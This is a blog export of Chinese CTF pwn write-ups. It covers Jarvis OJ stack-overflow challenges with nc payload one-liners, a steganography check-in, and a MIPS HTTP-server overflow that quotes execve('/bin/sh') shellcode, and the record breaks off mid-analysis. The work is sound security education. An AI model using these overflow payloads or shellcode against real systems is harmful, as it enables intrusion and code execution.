<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Jarvis Oj Pwn 做题记录</title>
      <link href="/2019/01/24/jarvis-oj-pwn-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/01/24/jarvis-oj-pwn-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-tell-me-something-Point-100"><a href="#0x01-tell-me-something-Point-100" class="headerlink" title="0x01 tell me something Point:100"></a>0x01 tell me something Point:100</h2><p>checksec:</p><pre><code>Arch:     amd64-64-littleRELRO:    No RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)</code></pre><p>很明显的漏洞点:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input your message:\n"</span>, <span class="number">20u</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">256u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"I have received your message, Thank you!\n"</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>read处读取了256个字符, 但是<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000004004E0 <span class="comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E0                 <span class="meta">public</span> main</span><br><span class="line"><span class="symbol">.text:</span>00000000004004E0 main            proc <span class="built_in">near</span>               <span class="comment">; DATA XREF: _start+1D↓o</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E0 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E0                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">88h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E7                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">14h</span>        <span class="comment">; n</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004EC                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, offset aInputYourMessa <span class="comment">; "Input your message:\n"</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004F1                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">1</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004F6                 <span class="keyword">call</span>    _write</span><br><span class="line"><span class="symbol">.text:</span>00000000004004FB                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rsp</span>        <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004FE                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">100h</span>       <span class="comment">; nbytes</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400503</span>                 <span class="keyword">xor</span>     <span class="built_in">edi</span>, <span class="built_in">edi</span>        <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400505</span>                 <span class="keyword">call</span>    _read</span><br><span class="line"><span class="symbol">.text:</span>000000000040050A                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">29h</span>        <span class="comment">; n</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040050F                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, offset aIHaveReceivedY <span class="comment">; "I have received your message, Thank you"...</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400514</span>                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">1</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400519</span>                 <span class="keyword">call</span>    _write</span><br><span class="line"><span class="symbol">.text:</span>000000000040051E                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">88h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400525</span>                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400525</span> <span class="comment">; &#125; // starts at 4004E0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400525</span> main            endp</span><br></pre></td></tr></table></figure></p><p>根据<code>sub     rsp, 88h</code>可知main函数的栈空间只有0x88 = 136字节, read的时候会溢出</p><p>我们输入12345678后看一下栈</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">gef➤  x/100g $<span class="built_in">sp</span></span><br><span class="line"><span class="number">0x7fffffffde20</span>:<span class="number">0x3837363534333231</span><span class="number">0x000000000000000a</span></span><br><span class="line"><span class="number">0x7fffffffde30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>按照小端序存放的输入, 即高字节存放在低地址, 低字节存放在高地址, 按4字节对齐</p><p>输入的<code>12345678</code>即<code>\x31\x32\x33\x34\x35\x36\x37\x38</code></p><pre><code>gef➤  x/10xw $sp0x7fffffffde20:    0x34333231    0x38373635    0x0000000a    0x000000000x7fffffffde30:    0x00000000    0x00000000    0x00000000    0x000000000x7fffffffde40:    0x00000000    0x00000000</code></pre><p>可以看到1234按4321的顺序放在0x7fffffffde20-0x7fffffffde23</p><p>5678按8765的顺序放在0x7fffffffde24-0x7fffffffde27</p><p>read函数结束的时候会返回到main函数继续执行, 返回的地址是保存在栈中的, 因此可以利用栈溢出覆盖返回地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">good_game</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+Fh] [rbp-9h]</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = fgetc(v0);</span><br><span class="line">    buf = result;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现一个good_game函数可以读取flag并输出</p><pre><code>.text:0000000000400620                 public good_game.text:0000000000400620 good_game       proc near.text:0000000000400620.text:0000000000400620 buf             = byte ptr -9.text:0000000000400620.text:0000000000400620 ; __unwind {.text:0000000000400620                 push    rbx.text:0000000000400621                 mov     esi, offset modes ; &quot;r&quot;.text:0000000000400626                 mov     edi, offset filename ; &quot;flag.txt&quot;</code></pre><p>地址是0x00400620, 即覆盖返回地址为0x00400620即可, 注意按照小端序, 64位程序补齐高4字节地址</p><p>payload:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'print "A" * 0x88 + "\x20\x06\x40\x00\x00\x00\x00\x00"' | nc pwn.jarvisoj.com 9876</span><br></pre></td></tr></table></figure></p><h2 id="0x02-Smashes-Point-200"><a href="#0x02-Smashes-Point-200" class="headerlink" title="0x02 Smashes Point:200"></a>0x02 Smashes Point:200</h2><pre><code>Arch:     amd64-64-littleRELRO:    No RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled</code></pre><p>开了Canary, 会检测标志位以防止栈溢出, 可以看到如果发生了栈溢出会输出:</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/3.png" alt="img"></p><p>在ida点菜单中的View-&gt;Open subviews-&gt;String可以打开字符串窗口, 看到</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/1.png" alt="img"></p><p>即flag是读到内存中了的</p><p>那么我们可以把flag的地址覆盖到argv[0]=/home/username/filename, 就可以输出flag</p><p>这个漏洞点也很明显:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4007E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+108h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Hello!\nWhat's your name? "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_IO_gets(&amp;v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  v0 = <span class="number">0L</span>L;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Nice to meet you, %s.\nPlease overwrite the flag: "</span>);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>read函数读取了0x28个数据, 但是在</p><pre><code>.text:00000000004007E0 sub_4007E0      proc near               ; CODE XREF: main+12↑p.text:00000000004007E0.text:00000000004007E0 var_20          = qword ptr -20h.text:00000000004007E0.text:00000000004007E0                 push    rbp.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; &quot;Hello!\nWhat&apos;s your name? &quot;.text:00000000004007E6                 mov     edi, 1</code></pre><p>可以看到只有0x20的栈, 存在栈溢出</p><p>那么我们只要一直填充数据到地址覆盖到argv[0]即可</p><p>让程序输入一些数据看一下输入开始的地址:</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/2.png" alt="img"></p><p>栈从低地址向高地址增加, argv[0]在高地址, main函数的栈在低地址, 然后main函数的栈帧中, 地址由低向高增加, 所以大量数据填充可以让我们的输入覆盖到高地址的argv[0]</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/4.png" alt="img"></p><p>搜索一下flag的位置</p><pre><code>pwndbg&gt; search CTF{smashes         0x400d21 push   r12 /* &quot;CTF{Here&apos;s the flag on server}&quot; */smashes         0x600d21 &quot;CTF{Here&apos;s the flag on server}</code></pre><p>还有argv[0]的位置</p><pre><code>pwndbg&gt; search /home/a/smasheswarning: Unable to access 16000 bytes of target memory at 0x7ffff7bd2d0e, halting search.[stack]         0x7fffffffe230 &apos;/home/a/smashes&apos;[stack]         0x7fffffffe800 &apos;/home/a/smashes&apos;[stack]         0x7fffffffefe8 &apos;/home/a/smashes&apos;</code></pre><p>输入数据保存的位置(栈顶)</p><pre><code>RSP  0x7fffffffe3b0 ◂— 0x34333231 /* &apos;1234&apos; */</code></pre><p>我们选取一个距离最远的,保证覆盖到argv[0]</p><p>按8字节小端序对齐</p><p>所以最终payload为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">python -c <span class="string">"print((0x7fffffffefe8 - 0x7fffffffe3b0) / 8 * '\x21\x0d\x40\x00\x00\x00\x00\x00' + '\n\n')"</span> | nc pwn.jarvisoj.com <span class="number">9877</span></span><br></pre></td></tr></table></figure><p>记录一下格式化字符串:</p><p>格式化占位符（format placeholder），语法是：</p><pre><code>%[parameter][flags][field width][.precision][length]type</code></pre><ul><li>parameter: n$, n用来指示是第几个参数, 如: <code>printf(&quot;%2$d, %1$d&quot;, 1, 2)</code> 输出的是<code>2, 1</code></li><li>flags: <ul><li>+: 正号, 表示有符号数值, 仅用于数值类型</li><li>空格: 输出有符号数的时候如果没有正负号或者零个字符, 就前缀一个空格, 与<code>+</code>同时出现的时候忽略</li><li>-: 左对齐, 默认情况下是右对齐</li><li>#: 不删除尾部0保持精度, 总输出小数点, 输出0, 0x, 0X表示进制</li></ul></li><li>field width: 给出显示数值的最小宽度, 不足时补齐, 超出时全部输出</li><li>.precision: 指明输出的最大长度</li><li>length: 指明参数长度, hh, 输出一个字节, h, 输出一个双字节</li><li>type: <ul><li>d/i: 有符号整数, 如果scanf的时候, 输入16进制数如<code>0x2f</code>, 则应用i, 否则d和i同义</li><li>u: 无符号整数</li><li>f/F: double型按10进制定点表示, 如2.2323</li><li>e/E: 按科学计数法表示, 1.5e002</li><li>g/G: double, 输出全部有效数字位</li><li>x/X: 16 进制 unsigned int</li><li>o/8: 进制 unsigned int</li><li>s: 如果没有用 l 标志, 输出 null 结尾字符串直到精度规定的上限; 如果没有指定精度，则输出所有字节. 如果用了 l 标志, 则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符, 相当于调用 wcrtomb 函数.</li></ul></li></ul><p><code>0000000000600D21</code> <code>\x21\x0d\x60\x00\x00\x00\x00\x00</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>训练赛记录</title>
      <link href="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这周做了UCAS的内部赛, 好像是什么月赛, 调出来pwn的时候才知道比赛时间只有11小时orz, 大佬们做的最多的是re1, 然而我ida打开以后看到一堆函数就不想看了233, 最终只提交了一个签到题, orz我好菜</p><h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>文件: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/checkin.png">checkin.png</a></p><p>LSB低位隐写，提取出来</p><p><code>XcHVycGxle2V6X2NoMVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD303032653732333338636361313061626437387D</code></p><p>后半段 <code>303032653732333338636361313061626437387D</code> 看起来是16进制串，解出来 <code>002e72338cca10abd78}</code></p><p>中段 <code>MVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD</code> 是base32： <code>eck_in_e7f8b198476dc</code></p><p>首段看起来是base64，解不出来，猜测是 <code>purple{ch</code></p><p>用base64以后是 <code>cHVycGxle2No</code></p><p>跟 <code>XcHVycGxle2V6X2No</code> 比较，看起来多了个X</p><p>解出来 <code>purple{ez_ch</code></p><p>结果：<code>purple{ez_check_in_e7f8b198476dc002e72338cca10abd78}</code></p><h1 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h1><p>文件在这里下载: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/bin.233">bin.233</a></p><p>题目给了一个binfile， checksec</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">mips-32-big</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">disabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br><span class="line"><span class="attr">RWX:</span>      <span class="string">Has</span> <span class="string">RWX</span> <span class="string">segments</span></span><br></pre></td></tr></table></figure><p>fine…mips环境搞起来</p><h2 id="0x01-QEMU-MIPS调试环境搭建"><a href="#0x01-QEMU-MIPS调试环境搭建" class="headerlink" title="0x01 QEMU MIPS调试环境搭建"></a>0x01 QEMU MIPS调试环境搭建</h2><p>下载虚拟机和内核文件 <code>https://people.debian.org/~aurel32/qemu/mips/</code></p><p>这里下载 <code>debian_wheezy_mips_standard.qcow2</code> 和 <code>vmlinux-3.2.0-4-4kc-malta</code></p><p>我宿主机是Vmware的Ubuntu 16.04, 在里面开qemu虚拟机, 采用网桥的方式建立MIPS虚拟机和Ubuntu的连接</p><p>安装QEMU: </p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">apt-get <span class="keyword">install</span> -y qemu qemu-<span class="keyword">user</span>-<span class="keyword">static</span> qemu-<span class="keyword">system</span></span><br></pre></td></tr></table></figure><p>下载虚拟机和内核文件</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>people.debian.org<span class="regexp">/~aurel32/</span>qemu<span class="regexp">/mips/</span>debian_wheezy_mips_standard.qcow2 &amp;&amp;</span><br><span class="line">wget https:<span class="regexp">//</span>people.debian.org<span class="regexp">/~aurel32/</span>qemu<span class="regexp">/mips/</span>vmlinux-<span class="number">3.2</span>.<span class="number">0</span>-<span class="number">4</span>-<span class="number">4</span>kc-malta</span><br></pre></td></tr></table></figure><p>然后，虚拟机，启动！</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mips_standard.qcow2 \</span><br><span class="line">    -append <span class="string">"root=/dev/sda1 console=tty0"</span> \</span><br><span class="line">    -netdev user,<span class="attribute">id</span>=net0 \</span><br><span class="line">    -device e1000,<span class="attribute">netdev</span>=net0,id=net0,mac=52:54:00:c9:18:27 \</span><br><span class="line">    -net<span class="built_in"> user </span>-redir tcp:2222::2222 \</span><br><span class="line">    -gdb tcp::22333 \</span><br><span class="line">    -redir tcp:1234::1234 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>账号密码都是root, 然后添加了端口映射, 便于在Ubuntu里调试</p><p>给Ubuntu安装pwndbg和调试MIPS的插件：<br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/pwndbg/pwndbg &amp;&amp;</span><br><span class="line"><span class="keyword">cd</span> pwndbg &amp;&amp;</span><br><span class="line">sudo bash setup.<span class="keyword">sh</span> &amp;&amp;</span><br><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure></p><p>关于调试:</p><p>我在qemu虚拟机里装了gdb和socat, 即:</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install gdb socat</span><br></pre></td></tr></table></figure><p>然后把要调试的文件传到了免费网盘github, 之后通过wget下载到qemu虚拟机中</p><p>然后用socat启动gdb调试, 这里的1234端口是上面启动虚拟机的时候设置的端口映射</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">socat</span> <span class="selector-tag">TCP-LISTEN</span><span class="selector-pseudo">:1234</span>,<span class="selector-tag">reuseaddr</span>,<span class="selector-tag">fork</span> <span class="selector-tag">EXEC</span><span class="selector-pseudo">:"gdb</span> <span class="selector-tag">bin</span><span class="selector-class">.233</span>"</span><br></pre></td></tr></table></figure><p>这样我们在Ubuntu机里就可以用 <code>nc 127.0.0.1 1234</code> 进行连接</p><p>输入payload可以用python脚本配合pwntools</p><p>如:<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote('<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>', <span class="number">1234</span>)</span><br></pre></td></tr></table></figure></p><p>后面的操作就相当于开了一个远程调试的gdb, 直接用pwntools发送指令即可, 比如查看栈内存:</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">r</span><span class="selector-class">.sendline</span>(<span class="string">'x/100wx $sp'</span>)</span><br></pre></td></tr></table></figure><p>蛋疼的是mips虚拟机里没法装pwndbg之类的工具, 只能用原始的gdb来调, 不过足够了</p><h2 id="0x02-反编译代码分析"><a href="#0x02-反编译代码分析" class="headerlink" title="0x02 反编译代码分析"></a>0x02 反编译代码分析</h2><p>我用的是jeb的mips反编译的, 可以试用一个月, 开个虚拟机到期就重置2333</p><p>main函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1)</span> </span>&#123;</span><br><span class="line">    setvbuf(*gvar_411214, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">    setvbuf(**&amp;gvar_411208, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">    param0 = *&amp;gvar_4111D4 + <span class="number">4448</span>;</span><br><span class="line">    <span class="keyword">char</span> *v0 = getenv(<span class="string">"PWD"</span>);</span><br><span class="line">    *&amp;ROOT = v0;</span><br><span class="line">    menu(param0, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">        respond(param0, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>menu函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">menu</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1, <span class="keyword">unsigned</span> <span class="keyword">int</span> param2, <span class="keyword">unsigned</span> <span class="keyword">int</span> param3)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"pwd"</span>, param1, param2, param3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start?"</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, *&amp;gvar_4111D8, <span class="number">1</span>, param3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>respond函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">respond</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1, <span class="keyword">unsigned</span> <span class="keyword">int</span> param2, <span class="keyword">unsigned</span> <span class="keyword">int</span> param3)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(gvar_4111D8, <span class="number">0</span>, <span class="number">4096</span>, param3);</span><br><span class="line">    <span class="keyword">int</span> result = read(<span class="number">0</span>, mesg, <span class="number">4096</span>, param3);</span><br><span class="line">    <span class="keyword">int</span> v0 = result;</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">        result = fwrite(<span class="string">"Client disconnected upexpectedly.\n"</span>, <span class="number">1</span>, <span class="number">34</span>, **&amp;gvar_41123C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = fwrite(<span class="string">"recv() error\n"</span>, <span class="number">1</span>, <span class="number">13</span>, **&amp;gvar_41123C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// len(result) &gt; 0, 有输入</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>, mesg, <span class="number">4096</span>, param3);</span><br><span class="line">        result = strtok(mesg, <span class="string">" \t\n"</span>, <span class="number">4096</span>, param3); <span class="comment">// 用" \t\n"切割字符串</span></span><br><span class="line">        result = <span class="built_in">strncmp</span>(result, <span class="string">"GET"</span>, <span class="number">4</span>, param3); <span class="comment">// 比较前4个字符</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">            result = strtok(mesg, <span class="string">" \t"</span>, <span class="number">4</span>, param3); <span class="comment">// 用" \t"切割字符串</span></span><br><span class="line">            <span class="keyword">char</span> *filename = result;</span><br><span class="line">            result = strtok(mesg, <span class="string">" \t\n"</span>, <span class="number">4</span>, param3); <span class="comment">// 用" \t\n"切割字符串</span></span><br><span class="line">            <span class="keyword">char</span> *protocol = result;</span><br><span class="line">            result = <span class="built_in">strncmp</span>(protocol, <span class="string">"HTTP/1.0"</span>, <span class="number">8</span>, param3); <span class="comment">// 比较前8个字符</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(result != <span class="number">0</span>) &#123;</span><br><span class="line">                result = <span class="built_in">strncmp</span>(protocol, <span class="string">"HTTP/1.1"</span>, <span class="number">8</span>, param3); <span class="comment">//比较</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(result != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"HTTP/1.0 400 Bad Request\n"</span>, <span class="number">25</span>, param3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result = <span class="built_in">strncmp</span>(filename, <span class="string">"/"</span>, <span class="number">2</span>, param3);</span><br><span class="line">            <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">                filename = <span class="string">"/index.html"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            env_str = *&amp;ROOT;</span><br><span class="line">            <span class="built_in">strcpy</span>(&amp;path, env_str); <span class="comment">// path = /home/fish</span></span><br><span class="line">            result = <span class="built_in">strlen</span>(*&amp;R00T, env_str, <span class="number">2</span>, param3); <span class="comment">// 路径的长度</span></span><br><span class="line">            <span class="comment">// 字符串拼接 path = /home/fish + v1,</span></span><br><span class="line">            <span class="comment">// 没有计算文件名的长度就直接copy了, 可以导致栈溢出</span></span><br><span class="line">            <span class="built_in">strcpy</span>(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(result + ((<span class="keyword">int</span>)(&amp;path)))), filename, <span class="number">2</span>, param3); </span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"file: %s\n"</span>, &amp;path, <span class="number">2</span>, param3); <span class="comment">// 输出path</span></span><br><span class="line">            result = open(&amp;path, <span class="number">0</span>, <span class="number">2</span>, param3); <span class="comment">// 打开path指向的文件</span></span><br><span class="line">            <span class="comment">// 文件存在则输出200 OK, 否则404</span></span><br><span class="line">            result = result != <span class="number">-1</span> ? write(l, <span class="string">"HTTP/1.0 200 0K\n\n"</span>, <span class="number">17</span>, param3): write(<span class="number">1</span>, <span class="string">"HTTP/1.0 404 Not Found\n"</span>, <span class="number">23</span>, param3);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h1><p>输入的HTTP请求段mesg:</p><p>GET /{file} HTTP/1.0</p><p><img src="/2019/01/19/训练赛记录/1.png" alt="img"></p><p>可以看到栈里的数据, strcpy复制的时候没检查长度造成栈溢出, 测得保存的文件路径在$sp + 0x2c处(本机测试的时候路径是/root)</p><p><img src="/2019/01/19/训练赛记录/2.png" alt="img"></p><p>$ra(返回地址寄存器)保存在$sp + 0x134处</p><p><img src="/2019/01/19/训练赛记录/3.png" alt="img"><br><img src="/2019/01/19/训练赛记录/4.png" alt="img"></p><p>/bin/sh也有了, system也有了</p><p><img src="/2019/01/19/训练赛记录/5.png" alt="img"></p><p><img src="/2019/01/19/训练赛记录/6.png" alt="img"></p><p>看起来是要构造ROP, 但是有一个问题是, payload里不能有\x00不然会截断</p><p>但是所有地址都是0x0040开头的, 所以没法构造ROP</p><p>本来跳转到 0x00400e68, 现在跳转到 0x7fff6b5a, a(1000b) 最低两个有效位有一个不是0</p><p>尝试把shellcode写到栈上然后控制$ra跳转过去</p><p>在Exploit-DB上找了个mips 32 big endian的shellcode</p><pre><code>shellcode  = &quot;\x28\x06\xff\xff&quot;      #  /* slti    a2,zero,-1   */shellcode += &quot;\x3c\x0f\x2f\x2f&quot;      #  /* lui     t7,0x2f2f    */shellcode += &quot;\x35\xef\x62\x69&quot;      #  /* ori     t7,t7,0x6269 */shellcode += &quot;\xaf\xaf\xff\xf4&quot;      #  /* sw      t7,-12(sp)   */shellcode += &quot;\x3c\x0e\x6e\x2f&quot;      #  /* lui     t6,0x6e2f    */shellcode += &quot;\x35\xce\x73\x68&quot;      #  /* ori     t6,t6,0x7368 */shellcode += &quot;\xaf\xae\xff\xf8&quot;      #  /* sw      t6,-8(sp)    */shellcode += &quot;\xaf\xa0\xff\xfc&quot;      #  /* sw      zero,-4(sp)  */shellcode += &quot;\x27\xa4\xff\xf4&quot;      #  /* addiu   a0,sp,-12    */shellcode += &quot;\x28\x05\xff\xff&quot;      #  /* slti    a1,zero,-1   */shellcode += &quot;\x24\x02\x0f\xab&quot;      #  /* li      v0,4011      */shellcode += &quot;\x01\x01\x01\x0c&quot;      #  /* syscall 0x40404      */</code></pre><p>看一下函数返回的操作</p><pre><code>  break         $sp        $ra          code0x00400CC0  